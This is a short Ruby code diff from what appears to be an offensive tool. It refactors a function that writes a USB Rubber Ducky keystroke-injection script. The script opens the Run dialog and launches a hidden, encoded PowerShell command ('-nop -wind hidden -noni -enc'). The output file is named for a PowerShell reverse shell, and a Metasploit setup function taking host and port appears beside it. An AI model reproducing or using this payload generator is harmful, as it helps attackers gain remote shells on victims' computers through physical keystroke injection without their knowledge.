@@ -58,12 +58,7 @@ def clean_shellcode(shellcode)
 end
 def ducky_setup(encoded_command)
 	print_info("Writing to file\n")
-	x = 0
-  fixed_string = encoded_command.scan(/.{40}/)
-	left_over = fixed_string.join.length - encoded_command.length
-  file = File.open("powershell_reverse_ducky.txt",'w')
-	file.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")
-	file.close
+  File.open("powershell_reverse_ducky.txt",'w') {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
 	print_success("File Complete\n")
 end
 def metasploit_setup(msf_path,host,port)
